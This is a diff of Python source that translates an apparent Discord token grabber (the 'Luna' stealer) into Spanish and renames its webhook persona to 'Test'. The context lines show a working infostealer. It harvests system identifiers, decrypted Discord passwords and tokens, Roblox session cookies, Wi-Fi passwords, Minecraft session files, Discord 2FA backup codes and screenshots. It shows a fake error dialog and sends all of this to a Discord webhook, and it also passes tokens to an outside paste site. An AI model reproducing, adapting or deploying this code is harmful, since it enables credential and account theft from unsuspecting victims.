@@ -1,3 +1,4 @@
+# Importamos las librerias
 import base64
 import ctypes
 import json
@@ -14,7 +15,6 @@ from shutil import copy2
 from sys import argv
 from tempfile import gettempdir, mkdtemp
 from zipfile import ZIP_DEFLATED, ZipFile
-
 import psutil
 import requests
 import wmi
@@ -58,7 +58,7 @@ def main(webhook: str):
         elif __PINGTYPE__ == "here":
             content += "@here"
 
-    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Test")
 
     PcInfo()
     Discord()
@@ -92,7 +92,7 @@ def configcheck(list):
 
 
 def fakeerror():
-    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occured while importing modules.', 'Fatal Error', 0)
+    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nA ocurrido un error interno mientras se importaban las librerias.', 'Error Fatal', 0)
 
 
 def startup():
@@ -169,12 +169,12 @@ class PcInfo:
         ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
 
         embed.add_field(
-            name="System Info",
-            value=f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
+            name="Informacion de el sistema",
+            value=f'''💻 **Usuario PC:** `{username}`\n:escritorio: **Nombre PC:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
             inline=False)
         embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
 
-        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Test")
 
 
 class Discord:
@@ -200,7 +200,7 @@ class Discord:
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except Exception:
-            return "Failed to decrypt password"
+            return "Error al desencriptar la contraseña"
 
     def get_master_key(self, path):
         with open(path, "r", encoding="utf-8") as f:
@@ -309,10 +309,10 @@ class Discord:
 
     def robloxinfo(self, webhook):
         try:
-            if robo_cookie == "No Roblox Cookies Found":
+            if robo_cookie == "Cookies de Roblox no encontradas":
                 pass
             else:
-                embed = Embed(title="Roblox Info", color=5639644)
+                embed = Embed(title="Informacion de Roblox", color=5639644)
                 headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
                 info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
 
@@ -324,7 +324,7 @@ class Discord:
                 webhook.send(
                     avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
                     embed=embed,
-                    username="Luna")
+                    username="Test")
         except Exception:
             pass
 
@@ -382,7 +382,7 @@ class Discord:
                     else:
                         methods += "❓"
 
-            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
+            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:telefono_movil: **Telefono:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
 
             if "code" in gift.text:
                 codes = json.loads(gift.text)
@@ -409,7 +409,7 @@ class Discord:
             webhook.send(
                 embed=embed,
                 avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
-                username="Luna")
+                username="Test")
             self.tokens_sent += token
 
         image = ImageGrab.grab(
@@ -610,7 +610,7 @@ class Wifi:
         os.makedirs(os.path.join(tempfolder, "Wifi"), exist_ok=True)
 
         with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
-            f.write(f"{github} | Wifi Networks & Passwords\n\n")
+            f.write(f"{github} | Redes wifi & Contraseñas\n\n")
 
         data = subprocess.getoutput('netsh wlan show profiles').split('\n')
         for line in data:
@@ -618,7 +618,7 @@ class Wifi:
                 self.wifi_list.append(line.split(":")[-1][1:])
             else:
                 with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
-                    f.write(f'There is no wireless interface on the system. Ethernet using twat.')
+                    f.write(f'No hay interfaz inalámbrica en el sistema. Ethernet usando twat.')
                 f.close()
 
         for i in self.wifi_list:
@@ -635,7 +635,7 @@ class Wifi:
 
         with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
             for i, j in self.name_pass.items():
-                f.write(f'Wifi Name : {i} | Password : {j}\n')
+                f.write(f'Nombre de el wifi : {i} | Contraseña : {j}\n')
         f.close()
 
 
@@ -653,7 +653,7 @@ class Minecraft:
 
     def session_info(self):
         with open(os.path.join(tempfolder, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
-            f.write(f"{github} | Minecraft Session Info\n\n")
+            f.write(f"{github} | Informacion de la sesión de Minecraft\n\n")
             if os.path.exists(self.roaming + self.accounts_path):
                 with open(self.roaming + self.accounts_path, "r") as g:
                     self.session = json.load(g)
@@ -664,7 +664,7 @@ class Minecraft:
 
     def user_cache(self):
         with open(os.path.join(tempfolder, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
-            f.write(f"{github} | Minecraft User Cache\n\n")
+            f.write(f"{github} | Cache de usuario Minecraft\n\n")
             if os.path.exists(self.roaming + self.usercache_path):
                 with open(self.roaming + self.usercache_path, "r") as g:
                     self.user = json.load(g)
@@ -685,14 +685,14 @@ class BackupCodes:
 
     def get_codes(self):
         with open(os.path.join(tempfolder, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
-            f.write(f"{github} | Discord Backup Codes\n\n")
+            f.write(f"{github} | Copias de seguridad de Discord\n\n")
             if os.path.exists(self.path + self.code_path):
                 with open(self.path + self.code_path, 'r') as g:
                     for line in g.readlines():
                         if line.startswith("*"):
                             f.write(line)
             else:
-                f.write("No discord backup codes found")
+                f.write("No se encontraron copias de seguridad de discord")
         f.close()
 
 
